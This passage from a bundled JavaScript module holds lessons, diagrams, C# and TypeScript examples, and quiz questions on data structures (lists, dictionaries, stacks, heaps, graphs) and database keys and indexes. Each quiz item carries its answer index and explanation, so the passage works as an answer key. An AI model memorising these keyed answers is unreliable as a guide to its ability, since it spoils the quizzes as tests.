of boxes: fast by position, slow at the front.",minutes:4,blocks:[{type:"text",text:`An **array** is a row of boxes, side by side in memory. Each box has a number (the **index**), starting at 0.
Because the boxes are side by side, the computer can jump straight to box 3. No searching.`},{type:"diagram",text:`index:  0     1     2     3     4
      ┌─────┬─────┬─────┬─────┬─────┐
      │ "a" │ "b" │ "c" │ "d" │ "e" │
      └─────┴─────┴─────┴─────┴─────┘
arr[3] → jump straight to box 3 → "d"   O(1)`},{type:"text",text:"A C# array (`int[]`) has a fixed size. `List<T>` is an array that can grow: when it is full, it creates a bigger array (about 2×) and copies everything over. A JS/TS `Array` grows in a similar way."},{type:"text",text:"Adding at the **end** is cheap. Inserting at the **front** is not: every item must move one box to the right."},{type:"diagram",text:`Insert "x" at index 0:
before  [a][b][c][d][e]
          ↘  ↘  ↘  ↘  ↘     every item moves 1 box
after   [x][a][b][c][d][e]       → O(n)`},{type:"code",code:{lang:"csharp",text:`var names = new List<string>();
names.Add("Ana");                 // O(1) on average
var first = names[0];             // O(1) — jump by index
names.Insert(0, "Bob");           // O(n) — shift everything right
names.RemoveAt(0);                // O(n) — shift everything left
bool has = names.Contains("Ana"); // O(n) — checks one by one`}},{type:"compare",left:{title:"Use it when ✅",items:["You read by position: `items[i]`","You mostly add at the end","You loop over all items in order",'You just need "a bunch of things"']},right:{title:"Avoid it when ⚠️",items:["You often search by id → Dictionary","You often insert/remove at the front",'You need "no duplicates" → Set']}},{type:"example",title:"Real world",text:"Lines in a shopping cart, search results in ranked order, points on a chart. You show them in order and loop over them. A list is perfect."}],remember:"Array/List = fast by index and at the end. Slow to search and slow at the front.",questions:[{id:"data-structures.array-list.1",kind:"mcq",difficulty:"easy",prompt:"You have a `List<Product>` with 1 million items. Which operation does the most work?",choices:["`products[500000]`","`products.Add(p)`","`products.Count`","`products.Insert(0, p)`"],answer:3,why:"Inserting at index 0 moves all 1 million items one position to the right. Reading by index and `Count` are O(1), and `Add` at the end is O(1) on average.",remember:"Insert at the front of a list = move everything."},{id:"data-structures.array-list.2",kind:"scenario",difficulty:"medium",prompt:"A signup check runs `blockedEmails.Contains(email)` on a `List<string>` with 50,000 emails, many times per second. CPU is high. What is the problem?",choices:["Lists cannot hold 50,000 items safely","`Contains` checks items one by one (O(n)) — a HashSet fits better","Nothing — `List.Contains` is O(1) like a dictionary","The list should be sorted before every call"],answer:1,why:'`List.Contains` walks the list until it finds a match, up to 50,000 checks per call. A `HashSet<string>` answers "is it here?" in O(1) on average.',remember:'"Is it in here?" many times → use a Set, not a List.'},{id:"data-structures.array-list.3",kind:"mcq",difficulty:"medium",prompt:'Why is `List<T>.Add` called "O(1) **amortized**" instead of simply O(1)?',choices:["It is O(1) only for value types such as `int`, not for classes","When full, it copies to a bigger array — rare, so the average is cheap","After 1,000 items every Add copies the whole array, so it is O(n)","The resize work runs on a background thread, so Add never waits"],answer:1,why:"Most Adds just write into a free slot. Sometimes the inner array is full and must be copied (O(n)). Because the size doubles, this is rare, so the average cost per Add stays O(1).",remember:"Know the size? `new List<T>(capacity)` skips the copies."}]},{id:"data-structures.hashmap-set",title:"Dictionary / HashMap and Set",summary:"Know the key, get the value — fast.",minutes:5,blocks:[{type:"text",text:`A **Dictionary** (also called HashMap or Map) stores **key → value** pairs.
Think of a real dictionary: if you know the word (key), you find the meaning (value) fast. You do not read every page.`},{type:"diagram",text:`key       hash()        bucket
"alice" ──────────────► [3] → ("alice", 42)
"bob"   ──────────────► [7] → ("bob", 17)
"carol" ──────────────► [1] → ("carol", 8)

get("bob"): hash → bucket 7 → found. No scanning.`},{type:"text",text:"A **hash function** turns the key into a number that says where to look. So get, add and remove are **O(1) on average**: about the same time for 10 items or 10 million."},{type:"code",code:{lang:"csharp",text:`var users = new Dictionary<int, User>();
users[42] = alice;                        // add or replace
if (users.TryGetValue(42, out var u)) { } // O(1) average

var seen = new HashSet<string>();
seen.Add("a@x.com");   // true  → added
seen.Add("a@x.com");   // false → already there`}},{type:"code",code:{lang:"ts",text:`const prices = new Map<string, number>();
prices.set('apple', 3);
prices.get('apple');            // 3, O(1) average

const tags = new Set(['js', 'ts', 'js']);
tags.size;                      // 2 — duplicate removed
tags.has('ts');                 // true, O(1) average`}},{type:"text",text:'A **Set** (`HashSet<T>`, JS `Set`) is like a dictionary with only keys. Use it for "have I seen this?" and to remove duplicates.'},{type:"compare",left:{title:"Use it when ✅",items:["You find things by id, email, code…",'You ask "have I seen this before?"',"You remove duplicates","You group or count items by a key"]},right:{title:"Watch out ⚠️",items:["Uses more memory than a plain list","C# Dictionary/HashSet: order is not guaranteed","Never change a key after adding it","Object keys: equal content ≠ equal key"]}},{type:"example",title:"Real world",text:"A cache of users by id. Counting words in a log (`word → count`). Feature flags by name. Skipping rows you already imported."}],remember:'HashMap = fast lookup by key. Set = fast "is it here?". Both O(1) on average.',questions:[{id:"data-structures.hashmap-set.1",kind:"scenario",difficulty:"easy",prompt:'You import 100,000 customer rows. You must skip any row whose email already appeared earlier in the same file. What is the best way to track "emails already seen"?',choices:["A `HashSet<string>` of emails","A `List<string>` plus `Contains`","A `Stack<string>` of emails","A `string[]` sorted after each row"],answer:0,why:"`HashSet.Add` returns false when the email is already there, in O(1) on average. A list would scan up to 100,000 emails for every row."},{id:"data-structures.hashmap-set.2",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"ts",text:`const a = { id: 1 };
const b = { id: 1 };
const set = new Set([a, b, a]);
console.log(set.size);`},choices:["1","3","2","It throws an error"],answer:2,why:"JS `Set` and `Map` compare objects by **reference**. `a` and `b` look the same but are two different objects, so both stay. The second `a` is a real duplicate and is dropped.",remember:"For objects, use the id as the key: `new Map(items.map(x => [x.id, x]))`."},{id:"data-structures.hashmap-set.3",kind:"debug",difficulty:"hard",prompt:'You use a C# **class** `OrderKey` with `Region` and `Year` as a Dictionary key. It does not override `Equals` or `GetHashCode`. `dict[new OrderKey("EU", 2026)]` throws `KeyNotFoundException`, but you added a key with the same values. Why?',choices:["Dictionary keys can only be strings or ints","The dictionary reached its maximum capacity","The class compares by reference, not by values","You must call `ContainsKey` before the indexer"],answer:2,why:"A plain class uses reference equality, so a new object with the same values is a different key. Use a `record`, a tuple key like `(string, int)`, or override `Equals` and `GetHashCode`.",remember:"Custom key → define equality (record / tuple / override)."},{id:"data-structures.hashmap-set.4",kind:"mcq",difficulty:"medium",prompt:'Dictionary lookup is "O(1) on average". When can it become much slower?',choices:["When the values are large objects","When many keys produce the same hash code","When the keys are strings","When you read the same key twice"],answer:1,why:"Keys with the same hash land in the same bucket, and the dictionary must compare them one by one. A bad custom `GetHashCode` (for example, always returning 0) turns every lookup into O(n)."}]},{id:"data-structures.stack-queue",title:"Stack and Queue",summary:"A pile of plates and a coffee line.",minutes:3,blocks:[{type:"text",text:"A **Stack** is a pile of plates. You put a plate on top (**push**) and take from the top (**pop**). Last in, first out: **LIFO**."},{type:"text",text:"A **Queue** is a line at a coffee shop. People join at the back (**enqueue**) and leave from the front (**dequeue**). First in, first out: **FIFO**."},{type:"diagram",text:`Stack (LIFO)           Queue (FIFO)

 push ↓   ↑ pop        in → [D][C][B][A] → out
    ┌───┐                   back     front
    │ C │ ← top
    │ B │               A came first,
    │ A │               A leaves first
    └───┘
C came last, C leaves first`},{type:"code",code:{lang:"csharp",text:`var undo = new Stack<string>();
undo.Push("type 'a'");
undo.Push("delete line");
undo.Pop();       // "delete line" — the last action

var jobs = new Queue<Email>();
jobs.Enqueue(welcomeMail);
jobs.Enqueue(resetMail);
jobs.Dequeue();   // welcomeMail — the first one in
// Push, Pop, Enqueue, Dequeue, Peek: all O(1)`}},{type:"compare",left:{title:"Stack — real world",items:["Undo / redo","Browser Back button","The call stack (each method call)","Matching brackets `{[()]}`","Depth-first search"]},right:{title:"Queue — real world",items:["Background jobs","Message queues (RabbitMQ, Service Bus)","Print queue","Requests waiting for a worker","Breadth-first search"]}},{type:"text",text:"JS/TS has no built-in queue. `push` + `pop` on an array is a fine stack. But `shift()` takes from the front, and engines usually move all the other items → O(n). For big queues, keep a head index instead of calling `shift()`."}],remember:"Stack = plates, last in first out. Queue = coffee line, first in first out.",questions:[{id:"data-structures.stack-queue.1",kind:"scenario",difficulty:"easy",prompt:"You build **Undo** for a drawing app. Every user action is saved. Undo must reverse the most recent action first, then the one before it. Which structure fits?",choices:["Queue","HashSet","Stack","Sorted list"],answer:2,why:'"Most recent first" is last in, first out. Push each action; Undo pops the top one.'},{id:"data-structures.stack-queue.2",kind:"code",difficulty:"medium",prompt:"This worker processes 200,000 jobs and is much slower than expected. What is the most likely reason?",code:{lang:"ts",text:`const queue: Job[] = loadJobs(); // 200,000 jobs
while (queue.length > 0) {
  const job = queue.shift()!;
  process(job);
}`},choices:["while loops are slow in JS engines","`queue.length` counts all items every time","`shift()` moves the remaining items each time → O(n²)","The `!` operator makes a copy of each job"],answer:2,why:"Removing from the front of a large array usually shifts every other item down. Done 200,000 times, that is O(n²). Loop with an index (`for (let i = 0; ...)`) or use a real queue.",remember:"JS: `pop()` is cheap, `shift()` on big arrays is not."},{id:"data-structures.stack-queue.3",kind:"debug",difficulty:"hard",prompt:"A recursive C# method walks a folder tree. On one customer's data (folders nested 200,000 levels deep) the whole process crashes with `StackOverflowException`. What is the usual fix?",choices:["Wrap the call in `try/catch (StackOverflowException)`","Run it on a server with more CPU","Make the method `async` so it uses less stack","Replace recursion with a loop and an explicit `Stack<T>`"],answer:3,why:"Each recursive call uses space on the call stack, which is small. In .NET a stack overflow cannot be caught — the process dies. A loop with your own `Stack<T>` keeps the pending work on the heap, which is much bigger.",remember:"Very deep recursion → loop + explicit Stack<T>."}]},{id:"data-structures.linked-list",title:"Linked List",summary:"A chain of nodes — great at one thing, slow at most.",minutes:3,blocks:[{type:"text",text:"A **linked list** is a chain. Each item (a **node**) holds a value and a pointer to the next node. The nodes can live anywhere in memory."},{type:"diagram",text:`head
 │
 ▼
┌───┬───┐   ┌───┬───┐   ┌───┬──────┐
│ A │ ●─┼──►│ B │ ●─┼──►│ C │ null │
└───┴───┘   └───┴───┘   └───┴──────┘

Insert X after A → change 2 pointers, nothing moves:
┌───┬───┐   ┌───┬───┐   ┌───┬───┐
│ A │ ●─┼──►│ X │ ●─┼──►│ B │ ●─┼──► C
└───┴───┘   └───┴───┘   └───┴───┘`},{type:"text",text:`The good part: if you already **hold** a node, inserting or removing next to it is O(1). Nothing shifts.
The bad part: there is no index. To reach item 500 you walk 500 steps → O(n). Searching is O(n) too.`},{type:"text",text:"In C#, `LinkedList<T>` is doubly linked: each node points to the next **and** the previous one. JS has no built-in linked list."},{type:"compare",left:{title:"Good at ✅",items:["Add/remove at the front or end: O(1)","Add/remove next to a node you hold: O(1)","Moving a node to the front (LRU caches)"]},right:{title:"Bad at ⚠️",items:["Get item by position: O(n)","Search: O(n)","Extra memory per node for pointers","Slow loops: nodes are spread around memory"]}},{type:"example",title:"Where you actually meet it",text:'An **LRU cache** ("drop the least recently used item") uses a Dictionary to find a node in O(1) plus a linked list to move it to the front in O(1).\nIn everyday app code, `List<T>` is usually faster, because items side by side in memory are very fast to read.'}],remember:"Linked list = chain. O(1) next to a node you hold, O(n) to find anything. Rarely your first choice.",questions:[{id:"data-structures.linked-list.1",kind:"truefalse",difficulty:"easy",prompt:"Inserting into a linked list is O(1), so inserting at **position 5,000** of a `LinkedList<T>` is also O(1).",choices:["True","False"],answer:1,why:"The insert itself is O(1), but first you must walk 5,000 nodes to reach that position. That walk is O(n).",remember:"O(1) insert only when you already hold the node."},{id:"data-structures.linked-list.2",kind:"compare",difficulty:"medium",prompt:'You keep 10,000 items. You loop over them often, sometimes read by index, and rarely insert (mostly at the end). A teammate says "use LinkedList, inserts are O(1)". Which is better here?',choices:["`List<T>`","`LinkedList<T>`"],answer:0,why:"The workload is loops, index reads and appends — all things a list does well. Linked list index reads are O(n), and its loops are slower because nodes are scattered in memory."},{id:"data-structures.linked-list.3",kind:"scenario",difficulty:"hard",prompt:"You build an LRU cache for 10,000 items. `Get(key)` must be fast and mark the item as most recently used. When full, the least recently used item is dropped. Which design gives O(1) for both?",choices:["A `List<T>` kept sorted by last-used time","A Dictionary of nodes + a doubly linked list","A single `Queue<T>` of keys","A `SortedDictionary` keyed by timestamp"],answer:1,why:"The dictionary finds the node in O(1). The linked list moves that node to the front and removes the tail in O(1). A queue cannot move an item from the middle; a sorted structure costs O(n) or O(log n)."}]},{id:"data-structures.tree-heap",title:"Tree and Heap",summary:'Sorted data, and "who is next?".',minutes:5,blocks:[{type:"text",text:"A **tree** is items connected parent → children. There is one root at the top and no loops. You use trees every day: folders, the HTML DOM, JSON, an org chart, menu categories."},{type:"diagram",text:`            /
      ┌─────┴─────┐
     src         docs
   ┌──┴───┐       │
 app.ts   ui/  readme.md`},{type:"text",text:"A **binary search tree** keeps keys sorted: smaller keys go left, bigger keys go right. Each step down throws away half → **O(log n)**, as long as the tree stays **balanced**."},{type:"diagram",text:`        50            find 65:
      ┌──┴──┐         50 → bigger, go right
     30     70        70 → smaller, go left
    ┌┴┐    ┌┴┐        65 → found in 3 steps
   20 40  65 90`},{type:"text",text:"You rarely write one yourself. In C#, `SortedDictionary<K,V>` and `SortedSet<T>` are balanced trees: add, remove and find are O(log n), and items always come out **sorted**. A plain `Dictionary` is faster (O(1)) but has no order. Database indexes are B-trees for the same reason."},{type:"text",text:'A **heap** is a tree with one promise: the **smallest** (or largest) item is always on top. It is **not** fully sorted. It only knows "who is first".'},{type:"diagram",text:`min-heap: parent ≤ children

       2          Peek()    → 2         O(1)
     ┌─┴─┐        Dequeue() → 2, fix    O(log n)
     5   3        Enqueue() → add, fix  O(log n)
   ┌─┴─┐
   9   7`},{type:"code",code:{lang:"csharp",text:`// .NET 6+: PriorityQueue is a min-heap.
// The LOWEST priority value comes out first.
var pq = new PriorityQueue<string, int>();
pq.Enqueue("send newsletter", 5);
pq.Enqueue("charge card", 1);
pq.Enqueue("resize image", 3);
pq.Dequeue();   // "charge card" (priority 1)`}},{type:"text",text:"JS/TS has no built-in heap. Use a small library, or just sort if the data is small and rarely changes."},{type:"compare",left:{title:"Sorted tree ✅",items:["Items must stay in sorted order",'Range queries: "keys from A to F"',"SortedDictionary / SortedSet: O(log n)"]},right:{title:"Heap ✅",items:["You only need the next smallest/biggest","Job scheduling, top-K, shortest path","PriorityQueue: O(log n) add/remove"]}}],remember:'Tree = sorted, O(log n) when balanced. Heap = "who is next?" fast, not fully sorted.',questions:[{id:"data-structures.tree-heap.1",kind:"scenario",difficulty:"medium",prompt:"A game must always know the **top 10 scores** among 5 million players. New scores arrive all the time. What is the best way to keep the current top 10?",choices:["A min-heap holding only the 10 best scores","Re-sort all 5 million scores on each new score","A `Stack<int>` of every score ever received","A `HashSet<int>` of all distinct scores"],answer:0,why:"The top of the heap is the smallest of the best 10. If a new score is bigger, remove the top and add the new one: O(log 10). Re-sorting 5 million items every time is O(n log n) per score.",remember:"Top-K → heap of size K."},{id:"data-structures.tree-heap.2",kind:"mcq",difficulty:"medium",prompt:"You map date → event. You often print all events **in date order**, and you also add and remove events. Which C# type fits best?",choices:["`Dictionary<DateTime, Event>`","`HashSet<Event>`","`Queue<Event>`","`SortedDictionary<DateTime, Event>`"],answer:3,why:"`SortedDictionary` keeps keys sorted all the time, with O(log n) add/remove. A `Dictionary` has no guaranteed order, so you would sort on every print."},{id:"data-structures.tree-heap.3",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`var pq = new PriorityQueue<string, int>();
pq.Enqueue("B", 2);
pq.Enqueue("A", 9);
pq.Enqueue("C", 1);
Console.WriteLine(pq.Dequeue());`},choices:["B","A","C","It throws an exception"],answer:2,why:"`PriorityQueue` is a min-heap: the item with the lowest priority value (1) comes out first. Insert order does not matter — it is not FIFO."},{id:"data-structures.tree-heap.4",kind:"debug",difficulty:"hard",prompt:"A home-made binary search tree is fast in tests with random ids. In production, ids arrive in increasing order (1, 2, 3, …) and lookups become very slow. Why?",choices:["Comparing bigger integers takes more time","Each new node goes right, so the tree becomes a long chain","Trees must be rebuilt after 1 million inserts","The garbage collector keeps moving the nodes"],answer:1,why:'Without balancing, sorted input makes every node the right child of the last one. The "tree" is really a linked list, so lookups are O(n). Built-in sorted collections are self-balancing and avoid this.',remember:"Unbalanced tree + sorted input = linked list."}]},{id:"data-structures.graph",title:"Graph",summary:"Things and the connections between them.",minutes:5,blocks:[{type:"text",text:"A **graph** is things (**nodes**) plus connections (**edges**). Unlike a tree, a graph can have **cycles** (loops) and many paths between two nodes."},{type:"diagram",text:`  Ana ───── Ben
   │      ╱  │
   │    ╱    │
  Cy ───── Dee ───── Eve

undirected: friendship goes both ways
directed:   A → B ("A follows B", "A needs B")`},{type:"list",items:['Social network: people + "follows"',"Maps: places + roads, with distance as the edge **weight**","Package dependencies: A needs B, B needs C","Microservices calling each other"]},{type:"text",text:"The usual way to store a graph in code is an **adjacency list**: a dictionary from each node to its neighbours."},{type:"code",code:{lang:"csharp",text:`var friends = new Dictionary<string, List<string>>
{
    ["Ana"] = new List<string> { "Ben", "Cy" },
    ["Ben"] = new List<string> { "Ana", "Cy", "Dee" },
    // ...
};`}},{type:"list",items:["**BFS** (breadth-first): visit all neighbours, then their neighbours. Uses a **queue**. Finds the shortest path when every edge costs the same.",'**DFS** (depth-first): go as deep as you can, then back up. Uses a **stack** (or recursion). Good for "can I reach X?" and finding cycles.',"Always keep a **visited** set. Graphs have cycles; without it you loop forever."]},{type:"code",code:{lang:"ts",text:`function reachable(start: string, graph: Map<string, string[]>) {
  const visited = new Set([start]);
  const queue = [start];
  for (let i = 0; i < queue.length; i++) {   // BFS
    for (const next of graph.get(queue[i]) ?? []) {
      if (!visited.has(next)) {
        visited.add(next);
        queue.push(next);
      }
    }
  }
  return visited;
}`}},{type:"example",title:"Dependency order",text:'A build tool must build B before A when A needs B. Ordering nodes so every arrow points forward is a **topological sort**. If there is a cycle (A → B → A), no valid order exists. That is the "circular dependency" error you have seen.'}],remember:"Graph = nodes + edges, may have cycles. BFS uses a queue, DFS a stack. Always track visited.",questions:[{id:"data-structures.graph.1",kind:"debug",difficulty:"medium",prompt:`A job follows "user referred user" links to build referral chains. On one customer's data it never finishes and memory keeps growing. What is the most likely cause?`,choices:["Dictionary lookups slow down over time","A cycle in the data, and no visited set","Graphs cannot hold more than 10,000 nodes","BFS only works on trees, not graphs"],answer:1,why:"If A referred B and (by a data bug) B referred A, the walk goes round and round, adding the same nodes again. A visited set stops it the second time it meets a node.",remember:"Walking a graph? Track visited."},{id:"data-structures.graph.2",kind:"scenario",difficulty:"medium",prompt:"A professional network shows whether someone is a 1st, 2nd or 3rd degree connection. Which way of walking the graph fits best?",choices:["BFS, because it explores level by level","DFS, because it goes deep first","Sort all users by name, then search","Binary search on the user ids"],answer:0,why:"BFS visits all direct friends (level 1), then their friends (level 2), and so on. The level where you first meet a person is their degree. DFS can reach them by a long path first."},{id:"data-structures.graph.3",kind:"mcq",difficulty:"easy",prompt:'Your DI container fails with "Circular dependency: `OrderService` → `PaymentService` → `OrderService`". In graph terms, what did it find?',choices:["A node with no edges","A tree that is too deep","Two nodes with the same name","A cycle in a directed graph"],answer:3,why:'Services are nodes and "needs" is a directed edge. Following the edges brings you back to the start: a cycle. No creation order can satisfy it.'},{id:"data-structures.graph.4",kind:"compare",difficulty:"hard",prompt:"You store a road graph with 1 million nodes. Each node has about 10 edges. Which storage is realistic?",choices:["A 1,000,000 × 1,000,000 grid of true/false","Each node keeps a list of its neighbours"],answer:1,why:'The grid (adjacency matrix) has a trillion cells, almost all "false" — far too much memory. The adjacency list stores only the ~10 million real edges.',remember:"Few edges per node → adjacency list."}]},{id:"data-structures.choosing",title:"Picking the right structure",summary:"Start from the question your code asks most.",minutes:3,blocks:[{type:"text",text:"Most real code needs only a few structures. Ask: **what question does my code ask most often?**"},{type:"diagram",text:`"Give me item #i" / loop in order → List / Array
"Find by key (id, email)"         → Dictionary / Map
"Seen it?" / no duplicates        → HashSet / Set
"Last thing added?" (undo)        → Stack
"First thing added?" (jobs)       → Queue
"Smallest / most urgent next?"    → PriorityQueue
"Keep it sorted by key"           → SortedDictionary
"Who connects to whom?"           → Graph`},{type:"text",text:"It is normal to **combine** them. One list for display order, plus one dictionary for lookups by id. You pay a bit of memory to make both operations fast."},{type:"example",title:"Real example",text:"An import reads 200,000 rows and needs the customer for each row. Loading 50,000 customers into a `Dictionary<int, Customer>` once is O(n), then each lookup is O(1).\nCalling `customers.First(c => c.Id == row.CustomerId)` per row instead can mean 200,000 × 50,000 = 10 billion comparisons."},{type:"text",text:"Also ask: **how big will this be in production?** 50 items → almost anything is fine. 5 million → the choice really matters."},{type:"text",text:"Careful: switching structure can change **behaviour**, not only speed. A Set drops equal items. A C# Dictionary does not promise order. A heap is not sorted when you loop over it."}],remember:'Pick by the main question: by position, by key, "seen it?", next in line, or smallest next.',questions:[{id:"data-structures.choosing.1",kind:"scenario",difficulty:"medium",prompt:'An admin page shows 20,000 products in a custom order chosen by the admin. The cart code often needs "get product by SKU". What should you keep in memory?',choices:["Only a `List<Product>`, searched by SKU each time","Only a `Dictionary<string, Product>`, order ignored","A `Stack<Product>` that serves both needs","A List for the order plus a Dictionary by SKU"],answer:3,why:'There are two different questions: "in what order?" and "which product has this SKU?". A list answers the first, a dictionary the second. Both point to the same objects, so the extra memory is small.'},{id:"data-structures.choosing.2",kind:"perf",difficulty:"medium",prompt:"A scheduler must always run the job with the earliest `RunAt` next. Thousands of jobs are added per minute. Current code: add to a `List<Job>`, then `jobs.OrderBy(j => j.RunAt).First()` each time. What is the best change?",choices:["Use a `Queue<Job>` — first in, first out","Use a `PriorityQueue<Job, DateTime>`","Keep the list, but call `Sort()` instead of `OrderBy`","Use a `HashSet<Job>` for O(1) access"],answer:1,why:"Sorting the whole list to get one item is O(n log n) every time. A heap gives the earliest job in O(log n). A plain Queue is ordered by insert time, not by `RunAt`.",remember:'"Smallest next", again and again → PriorityQueue.'},{id:"data-structures.choosing.3",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`var tags = new[] { "js", "JS", "ts", "js" };
var set = new HashSet<string>(tags,
    StringComparer.OrdinalIgnoreCase);
Console.WriteLine(set.Count);`},choices:["4","3","2","1"],answer:2,why:'The comparer ignores case, so "js" and "JS" are the same item. The set holds "js" and "ts" → 2. Without the comparer it would be 3.',remember:'A Set uses its comparer to decide what "equal" means.'},{id:"data-structures.choosing.4",kind:"debug",difficulty:"hard",prompt:"To speed up `Contains`, you change `List<OrderLine>` to `HashSet<OrderLine>`. `OrderLine` is a `record (string Sku, int Qty)`. QA reports that an order with two identical lines now shows only one line. Why?",choices:["A set keeps only one copy of equal items","HashSet sorts the items and drops the last one","Records cannot be stored in a HashSet","HashSet allows only one item per Sku value"],answer:0,why:"Records compare by value, so two lines with the same Sku and Qty are equal. A set keeps one of them. The new structure changed the meaning of the data, not only the speed.",remember:"Changing List → Set changes behaviour: duplicates disappear."}]}],cheatSheet:[{title:"Big-O by structure",items:[{term:"List<T> / Array",meaning:"By index O(1) · add at end O(1)* · insert/remove at front O(n) · Contains O(n)"},{term:"Dictionary / Map",meaning:"Get, add, remove by key O(1) average"},{term:"HashSet / Set",meaning:"Add, Contains / has, Remove O(1) average · no duplicates"},{term:"Stack<T>",meaning:"Push / Pop / Peek O(1) · last in, first out"},{term:"Queue<T>",meaning:"Enqueue / Dequeue O(1) · first in, first out"},{term:"LinkedList<T>",meaning:"Add/remove next to a node you hold O(1) · find or by index O(n)"},{term:"SortedDictionary / SortedSet",meaning:"Add, remove, find O(log n) · always sorted"},{term:"PriorityQueue<T, P>",meaning:"Enqueue / Dequeue O(log n) · Peek O(1) · lowest priority first"},{term:"* amortized",meaning:"Usually instant; sometimes copies everything into a bigger array"}]},{title:"Pick by the question",items:[{term:"By position / in order",meaning:"List<T>, Array"},{term:"By key",meaning:"Dictionary<K,V>, Map"},{term:"Seen it? / no duplicates",meaning:"HashSet<T>, Set"},{term:"Last in, first out",meaning:"Stack<T>, or array push / pop"},{term:"First in, first out",meaning:"Queue<T> (JS: avoid shift() on big arrays)"},{term:"Smallest / most urgent next",meaning:"PriorityQueue (heap)"},{term:"Sorted by key, ranges",meaning:"SortedDictionary, SortedSet"},{term:"Connections",meaning:"Graph: Dictionary<node, List<node>>"}]},{title:"Gotchas",items:[{term:"JS Set / Map with objects",meaning:"Compares by reference, not content — key by id"},{term:"C# class as a key",meaning:"Use a record / tuple, or override Equals + GetHashCode"},{term:"C# Dictionary order",meaning:"Not guaranteed — sort, or use SortedDictionary"},{term:"Changing a key",meaning:"Never change a key object after adding it to a Dictionary / Set"},{term:"Array shift() in a loop",meaning:"Usually O(n) each → O(n²) total"},{term:"Graph walk",meaning:"Always keep a visited set — cycles!"},{term:"Very deep recursion",meaning:"Stack overflow → loop + explicit Stack<T>"}]}]},p=Object.freeze(Object.defineProperty({__proto__:null,default:m},Symbol.toStringTag,{value:"Module"})),y={id:"database",title:"Database",emoji:"🗄️",tagline:"Indexes, plans, locks — why queries get slow",lessons:[{id:"database.keys",title:"Tables, primary keys and foreign keys",summary:"How rows are identified and linked.",minutes:3,blocks:[{type:"text",text:`A **table** stores rows. Every row has the same columns.
A **primary key** (PK) is the column that identifies one row. It must be unique and never empty.`},{type:"diagram",text:`Customers                 Orders
┌────┬───────┐           ┌────┬────────────┬───────┐
│ Id │ Name  │           │ Id │ CustomerId │ Total │
├────┼───────┤           ├────┼────────────┼───────┤
│ 1  │ Alice │ ◄──────── │ 10 │ 1          │ 50    │
│ 2  │ Bob   │ ◄──┐      │ 11 │ 1          │ 20    │
└────┴───────┘    └───── │ 12 │ 2          │ 75    │
   PK = Id               └────┴────────────┴───────┘
                            FK = CustomerId → Customers.Id`},{type:"text",text:'A **foreign key** (FK) says: "this value must exist in that other table". The database will reject an order for customer 99 if customer 99 does not exist.'},{type:"example",title:"Why it matters",text:"Without the FK, a bug can create orders that point to nobody. Reports then show money that belongs to no customer, and nobody notices for months."},{type:"text",text:"Tip: a foreign key does **not** automatically create an index in SQL Server. If you often query `WHERE CustomerId = @id`, you usually want an index on `CustomerId` too."}],remember:'PK = "which row is this?" FK = "this must point to a real row."',questions:[{id:"database.keys.1",kind:"mcq",difficulty:"easy",prompt:"What is the main job of a primary key?",choices:["Make the table load faster in the UI","Uniquely identify each row","Sort the rows alphabetically","Encrypt the row"],answer:1,why:"A primary key gives every row a unique identity, so you can find, update or reference exactly one row.",remember:"PK = unique identity of a row."},{id:"database.keys.2",kind:"scenario",difficulty:"medium",prompt:"Your `Orders` table has a `CustomerId` column but no foreign key. Someone deletes a customer. What can happen?",choices:["The orders are deleted too, because the column names match","The orders stay and point to a customer that no longer exists","The database refuses the delete, because orders still use it","The CustomerId of those orders is set to NULL automatically"],answer:1,why:'Without a foreign key the database does not know the two tables are related. The delete succeeds and the orders become "orphans".',remember:"No FK → orphan rows are possible."},{id:"database.keys.3",kind:"truefalse",difficulty:"medium",prompt:"In SQL Server, creating a foreign key on `Orders.CustomerId` also creates an index on that column.",choices:["True","False"],answer:1,why:"SQL Server creates an index for primary keys and unique constraints, but not for foreign keys. You add that index yourself if you query by the FK."}]},{id:"database.index",title:"Index: the book index",summary:"Find rows without reading the whole table.",minutes:4,blocks:[{type:"text",text:`Imagine a 900-page book. You want the page about "deadlock".
Without an index you read every page. With the index at the back, you jump straight to page 412.`},{type:"text",text:"A database **index** works the same way. It is a sorted copy of some columns, plus a pointer to the full row."},{type:"diagram",text:`Index on CustomerId            Orders table (20 million rows)
┌────────────┬──────┐
│ CustomerId │ Row  │
├────────────┼──────┤
│ 122        │ ...  │
│ 123        │ ●────┼──────►  row #8 201 553
│ 123        │ ●────┼──────►  row #15 002 004
│ 124        │ ...  │
└────────────┴──────┘
 sorted → find 123 in a few steps`},{type:"compare",left:{title:"Index Seek ✅",items:["Jump to the matching keys","Reads few pages","Like using the book index"]},right:{title:"Index / Table Scan ⚠️",items:["Read many or all entries","Reads many pages","Like reading the whole book"]}},{type:"text",text:"Indexes are not free. Every `INSERT`, `UPDATE` and `DELETE` must also update each index. A table with 15 indexes is fast to read and slow to write."},{type:"code",code:{lang:"sql",text:`-- Query
SELECT Id, Total
FROM Orders
WHERE CustomerId = 123;

-- Index that lets SQL Server seek, and also covers Total
CREATE INDEX IX_Orders_CustomerId
  ON Orders (CustomerId) INCLUDE (Total);`}}],remember:"Index = book index. Seek = jump. Scan = read a lot.",questions:[{id:"database.index.1",kind:"perf",difficulty:"easy",prompt:"`SELECT * FROM Orders WHERE CustomerId = 123` is slow. The table has 20 million rows. What would you investigate first?",choices:["Increase the connection pool size in the API settings","Whether there is an appropriate index on CustomerId","Add more API servers behind the load balancer","Add more CSS"],answer:1,why:"Without an index on CustomerId the database must scan all 20 million rows to find the matching ones. An index lets it jump to them.",remember:"Slow filter on a big table → check the index first."},{id:"database.index.2",kind:"mcq",difficulty:"easy",prompt:"In an execution plan, what is the usual difference between an **Index Seek** and an **Index Scan**?",choices:["Seek reads the whole index, Scan jumps only to matching entries","Seek jumps to matching entries, Scan reads many or all entries","They are the same; the plan just uses two names for one step","Seek is used only for primary keys, Scan for all other indexes"],answer:1,why:"A seek uses the sorted order to go straight to the matching keys. A scan walks through a large part of the index."},{id:"database.index.3",kind:"scenario",difficulty:"medium",prompt:"A teammate wants to add an index on every column of a table that receives 5,000 inserts per second. What is the main risk?",choices:["Reads get slower, because the optimizer must check too many indexes","Writes get slower, because each insert must update every index","The table can no longer have a primary key or a clustered index","No real risk, because indexes only use disk space, not CPU time"],answer:1,why:"Each index is an extra structure to maintain. On a write-heavy table, many indexes multiply the work of every insert and use more storage.",remember:"Indexes speed up reads and slow down 